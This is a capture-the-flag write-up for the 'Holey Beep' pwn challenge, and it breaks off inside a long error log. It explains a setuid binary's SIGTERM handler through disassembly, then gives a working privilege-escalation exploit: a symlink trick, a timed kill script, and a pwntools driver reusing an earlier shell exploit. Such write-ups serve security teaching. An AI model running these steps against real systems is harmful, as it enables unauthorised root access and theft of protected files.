# Holey Beep
PWN

## Description:
> That's it, we have code execution on the fridge. You can already see the /secret_cake_recipe. Wintermuted's TODO list has mentioned that the door alarm on the fridge is sounding all the time. This is usually a sign of the Holey Beep vulnerability. Maybe we finally found a way to get a root shell. You can smell the cake… metaphorically.



## Solution:

This is a direct continuation of the previous challenge - [Fridge TODO list](Fridge_TODO_List.md). 

You might ask yourself - we already have a shell, why can't we just read the file?

```console
$ cat /secret_cake_recipe
cat: /secret_cake_recipe: Permission denied
$ ls -al /
total 84
drwxr-xr-x  22 user   user    4096 Oct 24 19:10 .
drwxr-xr-x  22 user   user    4096 Oct 24 19:10 ..
-rwxr-xr-x   1 nobody nogroup    0 Oct 24 19:04 .dockerenv
drwxr-xr-x   2 nobody nogroup 4096 Oct 16 15:10 bin
drwxr-xr-x   2 nobody nogroup 4096 Apr 12  2016 boot
drwxr-xr-x   4 nobody nogroup 4096 Oct 24 19:04 dev
drwxr-xr-x  42 nobody nogroup 4096 Oct 24 19:04 etc
drwxr-xr-x   4 nobody nogroup 4096 Oct 24 19:04 home
drwxr-xr-x   8 nobody nogroup 4096 Sep 13  2015 lib
drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 lib64
drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 media
drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 mnt
drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 opt
dr-xr-xr-x 137 nobody nogroup    0 Dec  2 21:22 proc
drwx------   2 nobody nogroup 4096 Apr 17  2018 root
drwxr-xr-x   5 nobody nogroup 4096 Apr 17  2018 run
drwxr-xr-x   2 nobody nogroup 4096 Oct 16 15:10 sbin
-r--------   1 admin  nogroup 1257 Sep 26 15:44 secret_cake_recipe
drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 srv
drwxr-xr-x   2 nobody nogroup 4096 Feb  5  2016 sys
drwxrwxrwt   2 user   user      40 Dec  2 21:22 tmp
drwxr-xr-x   2 nobody nogroup 4096 Oct 24 19:04 todos
drwxr-xr-x  10 nobody nogroup 4096 Apr 17  2018 usr
drwxr-xr-x  11 nobody nogroup 4096 Apr 17  2018 var
```

We need admin permissions to read it, and we spawned a shell as user.

As you might remember, when searching for the flag in the previous challenge, we saw an extra file in the user directory:
```
 $ ls
 $ ls -al
total 52
drwxr-xr-x 3 user   user     4096 Oct 24 19:04 .
drwxr-xr-x 4 nobody nogroup  4096 Oct 24 19:04 ..
-rw-r--r-- 1 user   user      220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 user   user     3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 user   user      655 May 16  2017 .profile
-r-sr-xr-x 1 admin  user     9000 Sep 26 15:44 holey_beep
-r-xr-xr-x 1 user   nogroup 18224 Sep 26 15:44 todo
drwxrwxrwt 2 user   user       80 Dec  2 21:22 todos
$ ./holey_beep
holey_beep: usage: holey_beep period1 [period2] [period3] [...]
```

Notice the "s" in the `holey_beep` file's attributes. That's the "setuid" or "suid" bit. If an executable has the "setuid" bit set when a user executes it, it will execute with the owner's permission level and not the executor's permission level. So, we can use this to perform privilege escalation, if the program has a bug. And in fact, our case is based on a real-world exploit called... [Holey Beep](https://holeybeep.ninja/)! (A technical explanation can be found [here](https://sigint.sh/#/holeybeep)).

Let's extract `holey_beep` with a script based on the `exploit.py` from the previous stage (the binary was also attached to the challenge):
```python
from pwn import *
import exploit

r = exploit.spawn_shell()
r.sendline("cat holey_beep && exit")
r.recvuntil(" ")
out = r.recvall() # Will also contain some junk at the end, which won't affect the ELF
write("holey_beep", out)
```

Output:
```console
root@kali:/media/sf_CTFs/google/todo# python extract_beep.py
[*] '/media/sf_CTFs/google/todo/todo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to fridge-todo-list.ctfcompetition.com on port 1337: Done
[*] Address of write() @ .got.plt: 0x5646264e7916
[*] Address of write() plt: 0x910
[*] Address of system() plt: 0x940
[*] Base address: 0x5646264e7006
[*] Calculates address of system() resolution logic @ plt: 0x5646264e7946
[*] Storing TODO:
    00000000  2f 62 69 6e  2f 73 68 3b  46 79 4e 26  46 56 00 00  │/bin│/sh;│FyN&│FV··│
    00000010
[+] Receiving all data: Done (8.86KB)
[*] Closed connection to fridge-todo-list.ctfcompetition.com port 1337
root@kali:/media/sf_CTFs/google/todo# file holey_beep
holey_beep: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6fe5703ed40e673f85df5a7332b9ad3d94a17c99, not stripped
```

So we have an executable, let's explore it:
```
root@kali:/media/sf_CTFs/google/holey_beep# r2 holey_beep
 -- Don't wait for Travis
[0x00000800]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00000800]> afl
0x00000000    3 236  -> 225  sym.imp.__libc_start_main
0x00000720    3 23           sym._init
0x00000750    1 6            sym.imp.errx
0x00000760    1 6            sym.imp.ioctl
0x00000770    1 6            sym.imp.close
0x00000780    1 6            sym.imp.read
0x00000790    1 6            sym.imp.signal
0x000007a0    1 6            sym.imp.fprintf
0x000007b0    1 6            sym.imp.err
0x000007c0    1 6            sym.imp.open
0x000007d0    1 6            sym.imp.atoi
0x000007e0    1 6            sym.imp.exit
0x000007f0    1 6            fcn.000007f0
0x00000800    1 43           entry0
0x00000830    4 50   -> 40   sym.deregister_tm_clones
0x00000870    4 66   -> 57   sym.register_tm_clones
0x000008c0    5 58   -> 51   sym.__do_global_dtors_aux
0x00000900    1 10           entry1.init
0x0000090a    4 191          sym.handle_sigterm
0x000009c9   13 311          main
0x00000b00    3 101  -> 92   sym.__libc_csu_init
0x00000b70    1 2            sym.__libc_csu_fini
0x00000b74    1 9            sym._fini
[0x00000800]> s sym.main
[0x000009c9]> VV
```

The two important parts of the main function are:
```assembly
0x000009d8      488d352bffff.  lea rsi, [sym.handle_sigterm] ; 0x90a
0x000009df      bf0f000000     mov edi, 0xf
0x000009e4      e8a7fdffff     call sym.imp.signal         ; void signal(int sig, void *func)
```

... which sets `handle_sigterm` as `sigterm` handler, and:
```assembly
0x00000a32      488d3de20100.  lea rdi, str.dev_console    ; 0xc1b ; "dev/console"
0x00000a39      b800000000     mov eax, 0
0x00000a3e      e87dfdffff     call sym.imp.open           ; int open(const char *path, int oflag)
0x00000a43      89052f062000   mov dword obj.device, eax   ; [0x201078:4]=-1
```

... which opens `dev/console` (notice no leading slash) as `obj.device`.

Now, to `handle_sigterm`:
```assembly
[0x0000090a]> pdf
/ (fcn) sym.handle_sigterm 191
|   sym.handle_sigterm (int arg1);
|           ; var int local_404h @ rbp-0x404
|           ; var int local_400h @ rbp-0x400
|           ; arg int arg1 @ rdi
|           ; DATA XREF from main (0x9d8)
|           0x0000090a      55             push rbp
|           0x0000090b      4889e5         mov rbp, rsp
|           0x0000090e      4881ec100400.  sub rsp, 0x410
|           0x00000915      89bdfcfbffff   mov dword [local_404h], edi ; arg1
|           0x0000091b      8b0557072000   mov eax, dword obj.device   ; [0x201078:4]=-1
|           0x00000921      85c0           test eax, eax
|       ,=< 0x00000923      0f8896000000   js 0x9bf
|       |   0x00000929      8b0549072000   mov eax, dword obj.device   ; [0x201078:4]=-1
|       |   0x0000092f      ba00000000     mov edx, 0
|       |   0x00000934      be2f4b0000     mov esi, 0x4b2f             ; '/K'
|       |   0x00000939      89c7           mov edi, eax
|       |   0x0000093b      b800000000     mov eax, 0
|       |   0x00000940      e81bfeffff     call sym.imp.ioctl          ; int ioctl(int fd, unsigned long request)
|       |   0x00000945      85c0           test eax, eax
|      ,==< 0x00000947      7976           jns 0x9bf
|      ||   0x00000949      8b1529072000   mov edx, dword obj.device   ; [0x201078:4]=-1
|      ||   0x0000094f      488b052a0720.  mov rax, qword [obj.__TMC_END] ; obj.stderr__GLIBC_2.2.5 ; [0x201080:8]=0
|      ||   0x00000956      488d35430200.  lea rsi, str.ioctl__d__KIOCSOUND__0__failed. ; 0xba0 ; "ioctl(%d, KIOCSOUND, 0) failed."
|      ||   0x0000095d      4889c7         mov rdi, rax
|      ||   0x00000960      b800000000     mov eax, 0
|      ||   0x00000965      e836feffff     call sym.imp.fprintf        ; int fprintf(FILE *stream, const char *format,   ...)
|      ||   0x0000096a      488d9500fcff.  lea rdx, [local_400h]
|      ||   0x00000971      b800000000     mov eax, 0
|      ||   0x00000976      b980000000     mov ecx, 0x80
|      ||   0x0000097b      4889d7         mov rdi, rdx
|      ||   0x0000097e      f348ab         rep stosq qword [rdi], rax
|      ||   0x00000981      8b05f1062000   mov eax, dword obj.device   ; [0x201078:4]=-1
|      ||   0x00000987      488d8d00fcff.  lea rcx, [local_400h]
|      ||   0x0000098e      baff030000     mov edx, 0x3ff
|      ||   0x00000993      4889ce         mov rsi, rcx
|      ||   0x00000996      89c7           mov edi, eax
|      ||   0x00000998      e8e3fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|      ||   0x0000099d      488b05dc0620.  mov rax, qword [obj.__TMC_END] ; obj.stderr__GLIBC_2.2.5 ; [0x201080:8]=0
|      ||   0x000009a4      488d9500fcff.  lea rdx, [local_400h]
|      ||   0x000009ab      488d350e0200.  lea rsi, str.debug_data:___s ; 0xbc0 ; "debug_data: \"%s\""
|      ||   0x000009b2      4889c7         mov rdi, rax
|      ||   0x000009b5      b800000000     mov eax, 0
|      ||   0x000009ba      e8e1fdffff     call sym.imp.fprintf        ; int fprintf(FILE *stream, const char *format,   ...)
|      ``-> 0x000009bf      bf00000000     mov edi, 0
\           0x000009c4      e817feffff     call sym.imp.exit           ; void exit(int status)
```

It performs an IOCTL, and if it fails - will print 0x3ff bytes from `obj.device`. So, if we create a symbolic link from `/secret_cake_recipe` to `dev/console` (lucky us that they forgot the leading slash!), we get three things: 
1. The IOCTL will fail (since there is no real device, just a text file), causing it to enter the "print debug data" path
2. The debug data printed will be the contents of `obj.device`, which is a symbolic link to `/secret_cake_recipe`
3. The program runs as admin, so it can read `/secret_cake_recipe`

We just have to send `SIGTERM` at the right timing, and since we don't have a very good control of timing over the remote shell, we have to make the program run long enough by providing a VERY long argument list.

This is the script we're going to run in order to accomplish that:
```bash
cd /tmp
mkdir dev
ln -sf /secret_cake_recipe dev/console
echo /home/user/holey_beep \$\(seq 10000\) \& > script.sh
echo sleep 0.1 >> script.sh
echo kill -15 \$\(pgrep holey_beep\) >> script.sh
chmod +x script.sh
cat script.sh
./script.sh
```



The script:
```python
from pwn import *
import exploit

r = exploit.spawn_shell()

time.sleep(1)

exploit = """
cd /tmp
mkdir dev
ln -sf /secret_cake_recipe dev/console
echo /home/user/holey_beep \$\(seq 10000\) \& > script.sh
echo sleep 0.1 >> script.sh
echo kill -15 \$\(pgrep holey_beep\) >> script.sh
chmod +x script.sh
cat script.sh
./script.sh
exit
"""

log.info("Holey Beep exploit:\n{}".format(exploit))

for line in exploit.split("\n"):
    time.sleep(1)
    r.sendline(line)

print r.recvall()
```

The output:

```
root@kali:/media/sf_CTFs/google/holey_beep# python exploit.py
[*] '/media/sf_CTFs/google/holey_beep/todo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to fridge-todo-list.ctfcompetition.com on port 1337: Done
[*] Address of write() @ .got.plt: 0x562c33b9c916
[*] Address of write() plt: 0x910
[*] Address of system() plt: 0x940
[*] Base address: 0x562c33b9c006
[*] Calculates address of system() resolution logic @ plt: 0x562c33b9c946
[*] Storing TODO:
    00000000  2f 62 69 6e  2f 73 68 3b  46 c9 b9 33  2c 56 00 00  │/bin│/sh;│F··3│,V··│
    00000010
[*] Holey Beep exploit:

    cd /tmp
    mkdir dev
    ln -sf /secret_cake_recipe dev/console
    echo /home/user/holey_beep \$\(seq 10000\) \& > script.sh
    echo sleep 0.1 >> script.sh
    echo kill -15 \$\(pgrep holey_beep\) >> script.sh
    chmod +x script.sh
    cat script.sh
    ./script.sh
    exit
[+] Receiving all data: Done (37.06KB)
[*] Closed connection to fridge-todo-list.ctfcompetition.com port 1337
 /home/user/holey_beep $(seq 10000) &
sleep 0.1
kill -15 $(pgrep holey_beep)
ioctl(4, KIOCSOUND, 1) failed.ioctl(4, KIOCSOUND, 2) failed.ioctl(4, KIOCSOUND, 3) failed.ioctl(4, KIOCSOUND, 4) failed.ioctl(4, KIOCSOUND, 5) failed.ioctl(4, KIOCSOUND, 6) failed.ioctl(4, KIOCSOUND, 7) failed.ioctl(4, KIOCSOUND, 8) failed.ioctl(4, KIOCSOUND, 9) failed.ioctl(4, KIOCSOUND, 10) failed.ioctl(4, KIOCSOUND, 11) failed.ioctl(4, KIOCSOUND, 12) failed.ioctl(4, KIOCSOUND, 13) failed.ioctl(4, KIOCSOUND, 14) failed.ioctl(4, KIOCSOUND, 15) failed.ioctl(4, KIOCSOUND, 16) failed.ioctl(4, KIOCSOUND, 17) failed.ioctl(4, KIOCSOUND, 18) failed.ioctl(4, KIOCSOUND, 19) failed.ioctl(4, KIOCSOUND, 20) failed.ioctl(4, KIOCSOUND, 21) failed.ioctl(4, KIOCSOUND, 22) failed.ioctl(4, KIOCSOUND, 23) failed.ioctl(4, KIOCSOUND, 24) failed.ioctl(4, KIOCSOUND, 25) failed.ioctl(4, KIOCSOUND, 26) failed.ioctl(4, KIOCSOUND, 27) failed.ioctl(4, KIOCSOUND, 28) failed.ioctl(4, KIOCSOUND, 29) failed.ioctl(4, KIOCSOUND, 30) failed.ioctl(4, KIOCSOUND, 31) failed.ioctl(4, KIOCSOUND, 32) failed.ioctl(4, KIOCSOUND, 33) failed.ioctl(4, KIOCSOUND, 34) failed.ioctl(4, KIOCSOUND, 35) failed.ioctl(4, KIOCSOUND, 36) failed.ioctl(4, KIOCSOUND, 37) failed.ioctl(4, KIOCSOUND, 38) failed.ioctl(4, KIOCSOUND, 39) failed.ioctl(4, KIOCSOUND, 40) failed.ioctl(4, KIOCSOUND, 41) failed.ioctl(4, KIOCSOUND, 42) failed.ioctl(4, KIOCSOUND, 43) failed.ioctl(4, KIOCSOUND, 44) failed.ioctl(4, KIOCSOUND, 45) failed.ioctl(4, KIOCSOUND, 46) failed.ioctl(4, KIOCSOUND, 47) failed.ioctl(4, KIOCSOUND, 48) failed.ioctl(4, KIOCSOUND, 49) failed.ioctl(4, KIOCSOUND, 50) failed.ioctl(4, KIOCSOUND, 51) failed.ioctl(4, KIOCSOUND, 52) failed.ioctl(4, KIOCSOUND, 53) failed.ioctl(4, KIOCSOUND, 54) failed.ioctl(4, KIOCSOUND, 55) failed.ioctl(4, KIOCSOUND, 56) failed.ioctl(4, KIOCSOUND, 57) failed.ioctl(4, KIOCSOUND, 58) failed.ioctl(4, KIOCSOUND, 59) failed.ioctl(4, KIOCSOUND, 60) failed.ioctl(4, KIOCSOUND, 61) failed.ioctl(4, KIOCSOUND, 62) failed.ioctl(4, KIOCSOUND, 63) failed.ioctl(4, KIOCSOUND, 64) failed.ioctl(4, KIOCSOUND, 65) failed.ioctl(4, KIOCSOUND, 66) failed.ioctl(4, KIOCSOUND, 67) failed.ioctl(4, KIOCSOUND, 68) failed.ioctl(4, KIOCSOUND, 69) failed.ioctl(4, KIOCSOUND, 70) failed.ioctl(4, KIOCSOUND, 71) failed.ioctl(4, KIOCSOUND, 72) failed.ioctl(4, KIOCSOUND, 73) failed.ioctl(4, KIOCSOUND, 74) failed.ioctl(4, KIOCSOUND, 75) failed.ioctl(4, KIOCSOUND, 76) failed.ioctl(4, KIOCSOUND, 77) failed.ioctl(4, KIOCSOUND, 78) failed.ioctl(4, KIOCSOUND, 79) failed.ioctl(4, KIOCSOUND, 80) failed.ioctl(4, KIOCSOUND, 81) failed.ioctl(4, KIOCSOUND, 82) failed.ioctl(4, KIOCSOUND, 83) failed.ioctl(4, KIOCSOUND, 84) failed.ioctl(4, KIOCSOUND, 85) failed.ioctl(4, KIOCSOUND, 86) failed.ioctl(4, KIOCSOUND, 87) failed.ioctl(4, KIOCSOUND, 88) failed.ioctl(4, KIOCSOUND, 89) failed.ioctl(4, KIOCSOUND, 90) failed.ioctl(4, KIOCSOUND, 91) failed.ioctl(4, KIOCSOUND, 92) failed.ioctl(4, KIOCSOUND, 93) failed.ioctl(4, KIOCSOUND, 94) failed.ioctl(4, KIOCSOUND, 95) failed.ioctl(4, KIOCSOUND, 96) failed.ioctl(4, KIOCSOUND, 97) failed.ioctl(4, KIOCSOUND, 98) failed.ioctl(4, KIOCSOUND, 99) failed.ioctl(4, KIOCSOUND, 100) failed.ioctl(4, KIOCSOUND, 101) failed.ioctl(4, KIOCSOUND, 102) failed.ioctl(4, KIOCSOUND, 103) failed.ioctl(4, KIOCSOUND, 104) failed.ioctl(4, KIOCSOUND, 105) failed.ioctl(4, KIOCSOUND, 106) failed.ioctl(4, KIOCSOUND, 107) failed.ioctl(4, KIOCSOUND, 108) failed.ioctl(4, KIOCSOUND, 109) failed.ioctl(4, KIOCSOUND, 110) failed.ioctl(4, KIOCSOUND, 111) failed.ioctl(4, KIOCSOUND, 112) failed.ioctl(4, KIOCSOUND, 113) failed.ioctl(4, KIOCSOUND, 114) failed.ioctl(4, KIOCSOUND, 115) failed.ioctl(4, KIOCSOUND, 116) failed.ioctl(4, KIOCSOUND, 117) failed.ioctl(4, KIOCSOUND, 118) failed.ioctl(4, KIOCSOUND, 119) failed.ioctl(4, KIOCSOUND, 120) failed.ioctl(4, KIOCSOUND, 121) failed.ioctl(4, KIOCSOUND, 122) failed.ioctl(4, KIOCSOUND, 123) failed.ioctl(4, KIOCSOUND, 124) failed.ioctl(4, KIOCSOUND, 125) failed.ioctl(4, KIOCSOUND, 126) failed.ioctl(4, KIOCSOUND, 127) failed.ioctl(4, KIOCSOUND, 128) failed.ioctl(4, KIOCSOUND, 129) failed.ioctl(4, KIOCSOUND, 130) failed.ioctl(4, KIOCSOUND, 131) failed.ioctl(4, KIOCSOUND, 132) failed.ioctl(4, KIOCSOUND, 133) failed.ioctl(4, KIOCSOUND, 134) failed.ioctl(4, KIOCSOUND, 135) failed.ioctl(4, KIOCSOUND, 136) failed.ioctl(4, KIOCSOUND, 137) failed.ioctl(4, KIOCSOUND, 138) failed.ioctl(4, KIOCSOUND, 139) failed.ioctl(4, KIOCSOUND, 140) failed.ioctl(4, KIOCSOUND, 141) failed.ioctl(4, KIOCSOUND, 142) failed.ioctl(4, KIOCSOUND, 143) failed.ioctl(4, KIOCSOUND, 144) failed.ioctl(4, KIOCSOUND, 145) failed.ioctl(4, KIOCSOUND, 146) failed.ioctl(4, KIOCSOUND, 147) failed.ioctl(4, KIOCSOUND, 148) failed.ioctl(4, KIOCSOUND, 149) failed.ioctl(4, KIOCSOUND, 150) failed.ioctl(4, KIOCSOUND, 151) failed.ioctl(4, KIOCSOUND, 152) failed.ioctl(4, KIOCSOUND, 153) failed.ioctl(4, KIOCSOUND, 154) failed.ioctl(4, KIOCSOUND, 155) failed.ioctl(4, KIOCSOUND, 156) failed.ioctl(4, KIOCSOUND, 157) failed.ioctl(4, KIOCSOUND, 158) failed.ioctl(4, KIOCSOUND, 159) failed.ioctl(4, KIOCSOUND, 160) failed.ioctl(4, KIOCSOUND, 161) failed.ioctl(4, KIOCSOUND, 162) failed.ioctl(4, KIOCSOUND, 163) failed.ioctl(4, KIOCSOUND, 164) failed.ioctl(4, KIOCSOUND, 165) failed.ioctl(4, KIOCSOUND, 166) failed.ioctl(4, KIOCSOUND, 167) failed.ioctl(4, KIOCSOUND, 168) failed.ioctl(4, KIOCSOUND, 169) failed.ioctl(4, KIOCSOUND, 170) failed.ioctl(4, KIOCSOUND, 171) failed.ioctl(4, KIOCSOUND, 172) failed.ioctl(4, KIOCSOUND, 173) failed.ioctl(4, KIOCSOUND, 174) failed.ioctl(4, KIOCSOUND, 175) failed.ioctl(4, KIOCSOUND, 176) failed.ioctl(4, KIOCSOUND, 177) failed.ioctl(4, KIOCSOUND, 178) failed.ioctl(4, KIOCSOUND, 179) failed.ioctl(4, KIOCSOUND, 180) failed.ioctl(4, KIOCSOUND, 181) failed.ioctl(4, KIOCSOUND, 182) failed.ioctl(4, KIOCSOUND, 183) failed.ioctl(4, KIOCSOUND, 184) failed.ioctl(4, KIOCSOUND, 185) failed.ioctl(4, KIOCSOUND, 186) failed.ioctl(4, KIOCSOUND, 187) failed.ioctl(4, KIOCSOUND, 188) failed.ioctl(4, KIOCSOUND, 189) failed.ioctl(4, KIOCSOUND, 190) failed.ioctl(4, KIOCSOUND, 191) failed.ioctl(4, KIOCSOUND, 192) failed.ioctl(4, KIOCSOUND, 193) failed.ioctl(4, KIOCSOUND, 194) failed.ioctl(4, KIOCSOUND, 195) failed.ioctl(4, KIOCSOUND, 196) failed.ioctl(4, KIOCSOUND, 197) failed.ioctl(4, KIOCSOUND, 198) failed.ioctl(4, KIOCSOUND, 199) failed.ioctl(4, KIOCSOUND, 200) failed.ioctl(4, KIOCSOUND, 201) failed.ioctl(4, KIOCSOUND, 202) failed.ioctl(4, KIOCSOUND, 203) failed.ioctl(4, KIOCSOUND, 204) failed.ioctl(4, KIOCSOUND, 205) failed.ioctl(4, KIOCSOUND, 206) failed.ioctl(4, KIOCSOUND, 207) failed.ioctl(4, KIOCSOUND, 208) failed.ioctl(4, KIOCSOUND, 209) failed.ioctl(4, KIOCSOUND, 210) failed.ioctl(4, KIOCSOUND, 211) failed.ioctl(4, KIOCSOUND, 212) failed.ioctl(4, KIOCSOUND, 213) failed.ioctl(4, KIOCSOUND, 214) failed.ioctl(4, KIOCSOUND, 215) failed.ioctl(4, KIOCSOUND, 216) failed.ioctl(4, KIOCSOUND, 217) failed.ioctl(4, KIOCSOUND, 218) failed.ioctl(4, KIOCSOUND, 219) failed.ioctl(4, KIOCSOUND, 220) failed.ioctl(4, KIOCSOUND, 221) failed.ioctl(4, KIOCSOUND, 222) failed.ioctl(4, KIOCSOUND, 223) failed.ioctl(4, KIOCSOUND, 224) failed.ioctl(4, KIOCSOUND, 225) failed.ioctl(4, KIOCSOUND, 226) failed.ioctl(4, KIOCSOUND, 227) failed.ioctl(4, KIOCSOUND, 228) failed.ioctl(4, KIOCSOUND, 229) failed.ioctl(4, KIOCSOUND, 230) failed.ioctl(4, KIOCSOUND, 231) failed.ioctl(4, KIOCSOUND, 232) failed.ioctl(4, KIOCSOUND, 233) failed.ioctl(4, KIOCSOUND, 234) failed.ioctl(4, KIOCSOUND, 235) failed.ioctl(4, KIOCSOUND, 236) failed.ioctl(4, KIOCSOUND, 237) failed.ioctl(4, KIOCSOUND, 238) failed.ioctl(4, KIOCSOUND, 239) failed.ioctl(4, KIOCSOUND, 240) failed.ioctl(4, KIOCSOUND, 241) failed.ioctl(4, KIOCSOUND, 242) failed.ioctl(4, KIOCSOUND, 243) failed.ioctl(4, KIOCSOUND, 244) failed.ioctl(4, KIOCSOUND, 245) failed.ioctl(4, KIOCSOUND, 246) failed.ioctl(4, KIOCSOUND, 247) failed.ioctl(4, KIOCSOUND, 248) failed.ioctl(4, KIOCSOUND, 249) failed.ioctl(4, KIOCSOUND, 250) failed.ioctl(4, KIOCSOUND, 251) failed.ioctl(4, KIOCSOUND, 252) failed.ioctl(4, KIOCSOUND, 253) failed.ioctl(4, KIOCSOUND, 254) failed.ioctl(4, KIOCSOUND, 255) failed.ioctl(4, KIOCSOUND, 256) failed.ioctl(4, KIOCSOUND, 257) failed.ioctl(4, KIOCSOUND, 258) failed.ioctl(4, KIOCSOUND, 259) failed.ioctl(4, KIOCSOUND, 260) failed.ioctl(4, KIOCSOUND, 261) failed.ioctl(4, KIOCSOUND, 262) failed.ioctl(4, KIOCSOUND, 263) failed.ioctl(4, KIOCSOUND, 264) failed.ioctl(4, KIOCSOUND, 265) failed.ioctl(4, KIOCSOUND, 266) failed.ioctl(4, KIOCSOUND, 267) failed.ioctl(4, KIOCSOUND, 268) failed.ioctl(4, KIOCSOUND, 269) failed.ioctl(4, KIOCSOUND, 270) failed.ioctl(4, KIOCSOUND, 271) failed.ioctl(4, KIOCSOUND, 272) failed.ioctl(4, KIOCSOUND, 273) failed.ioctl(4, KIOCSOUND, 274) failed.ioctl(4, KIOCSOUND, 275) failed.ioctl(4, KIOCSOUND, 276) failed.ioctl(4, KIOCSOUND, 277) failed.ioctl(4, KIOCSOUND, 278) failed.ioctl(4, KIOCSOUND, 279) failed.ioctl(4, KIOCSOUND, 280) failed.ioctl(4, KIOCSOUND, 281) failed.ioctl(4, KIOCSOUND, 282) failed.ioctl(4, KIOCSOUND, 283) failed.ioctl(4, KIOCSOUND, 284) failed.ioctl(4, KIOCSOUND, 285) failed.ioctl(4, KIOCSOUND, 286) failed.ioctl(4, KIOCSOUND, 287) failed.ioctl(4, KIOCSOUND, 288) failed.ioctl(4, KIOCSOUND, 289) failed.ioctl(4, KIOCSOUND, 290) failed.ioctl(4, KIOCSOUND, 291) failed.ioctl(4, KIOCSOUND, 292) failed.ioctl(4, KIOCSOUND, 293) failed.ioctl(4, KIOCSOUND, 294) failed.ioctl(4, KIOCSOUND, 295) failed.ioctl(4, KIOCSOUND, 296) failed.ioctl(4, KIOCSOUND, 297) failed.ioctl(4, KIOCSOUND, 298) failed.ioctl(4, KIOCSOUND, 299) failed.ioctl(4, KIOCSOUND, 300) failed.ioctl(4, KIOCSOUND, 301) failed.ioctl(4, KIOCSOUND, 302) failed.ioctl(4, KIOCSOUND, 303) failed.ioctl(4, KIOCSOUND, 304) failed.ioctl(4, KIOCSOUND, 305) failed.ioctl(4, KIOCSOUND, 306) failed.ioctl(4, KIOCSOUND, 307) failed.ioctl(4, KIOCSOUND, 308) failed.ioctl(4, KIOCSOUND, 309) failed.ioctl(4, KIOCSOUND, 310) failed.ioctl(4, KIOCSOUND, 311) failed.ioctl(4, KIOCSOUND, 312) failed.ioctl(4, KIOCSOUND, 313) failed.ioctl(4, KIOCSOUND, 314) failed.ioctl(4, KIOCSOUND, 315) failed.ioctl(4, KIOCSOUND, 316) failed.ioctl(4, KIOCSOUND, 317) failed.ioctl(4, KIOCSOUND, 318) failed.ioctl(4, KIOCSOUND, 319) failed.ioctl(4, KIOCSOUND, 320) failed.ioctl(4, KIOCSOUND, 321) failed.ioctl(4, KIOCSOUND, 322) failed.ioctl(4, KIOCSOUND, 323) failed.ioctl(4, KIOCSOUND, 324) failed.ioctl(4, KIOCSOUND, 325) failed.ioctl(4, KIOCSOUND, 326) failed.ioctl(4, KIOCSOUND, 327) failed.ioctl(4, KIOCSOUND, 328) failed.ioctl(4, KIOCSOUND, 329) failed.ioctl(4, KIOCSOUND, 330) failed.ioctl(4, KIOCSOUND, 331) failed.ioctl(4, KIOCSOUND, 332) failed.ioctl(4, KIOCSOUND, 333) failed.ioctl(4, KIOCSOUND, 334) failed.ioctl(4, KIOCSOUND, 335) failed.ioctl(4, KIOCSOUND, 336) failed.ioctl(4, KIOCSOUND, 337) failed.ioctl(4, KIOCSOUND, 338) failed.ioctl(4, KIOCSOUND, 339) failed.ioctl(4, KIOCSOUND, 340) failed.ioctl(4, KIOCSOUND, 341) failed.ioctl(4, KIOCSOUND, 342) failed.ioctl(4, KIOCSOUND, 343) failed.ioctl(4, KIOCSOUND, 344) failed.ioctl(4, KIOCSOUND, 345) failed.ioctl(4, KIOCSOUND, 346) failed.ioctl(4, KIOCSOUND, 347) failed.ioctl(4, KIOCSOUND, 348) failed.ioctl(4, KIOCSOUND, 349) failed.ioctl(4, KIOCSOUND, 350) failed.ioctl(4, KIOCSOUND, 351) failed.ioctl(4, KIOCSOUND, 352) failed.ioctl(4, KIOCSOUND, 353) failed.ioctl(4, KIOCSOUND, 354) failed.ioctl(4, KIOCSOUND, 355) failed.ioctl(4, KIOCSOUND, 356) failed.ioctl(4, KIOCSOUND, 357) failed.ioctl(4, KIOCSOUND, 358) failed.ioctl(4, KIOCSOUND, 359) failed.ioctl(4, KIOCSOUND, 360) failed.ioctl(4, KIOCSOUND, 361) failed.ioctl(4, KIOCSOUND, 362) failed.ioctl(4, KIOCSOUND, 363) failed.ioctl(4, KIOCSOUND, 364) failed.ioctl(4, KIOCSOUND, 365) failed.ioctl(4, KIOCSOUND, 366) failed.ioctl(4, KIOCSOUND, 367) failed.ioctl(4, KIOCSOUND, 368) failed.ioctl(4, KIOCSOUND, 369) failed.ioctl(4, KIOCSOUND, 370) failed.ioctl(4, KIOCSOUND, 371) failed.ioctl(4, KIOCSOUND, 372) failed.ioctl(4, KIOCSOUND, 373) failed.ioctl(4, KIOCSOUND, 374) failed.ioctl(4, KIOCSOUND, 375) failed.ioctl(4, KIOCSOUND, 376) failed.ioctl(4, KIOCSOUND, 377) failed.ioctl(4, KIOCSOUND, 378) failed.ioctl(4, KIOCSOUND, 379) failed.ioctl(4, KIOCSOUND, 380) failed.ioctl(4, KIOCSOUND, 381) failed.ioctl(4, KIOCSOUND, 382) failed.ioctl(4, KIOCSOUND, 383) failed.ioctl(4, KIOCSOUND, 384) failed.ioctl(4, KIOCSOUND, 385) failed.ioctl(4, KIOCSOUND, 386) failed.ioctl(4, KIOCSOUND, 387) failed.ioctl(4, KIOCSOUND, 388) failed.ioctl(4, KIOCSOUND, 389) failed.ioctl(4, KIOCSOUND, 390) failed.ioctl(4, KIOCSOUND, 391) failed.ioctl(4, KIOCSOUND, 392) failed.ioctl(4, KIOCSOUND, 393) failed.ioctl(4, KIOCSOUND, 394) failed.ioctl(4, KIOCSOUND, 395) failed.ioctl(4, KIOCSOUND, 396) failed.ioctl(4, KIOCSOUND, 397) failed.ioctl(4, KIOCSOUND, 398) failed.ioctl(4, KIOCSOUND, 399) failed.ioctl(4, KIOCSOUND, 400) 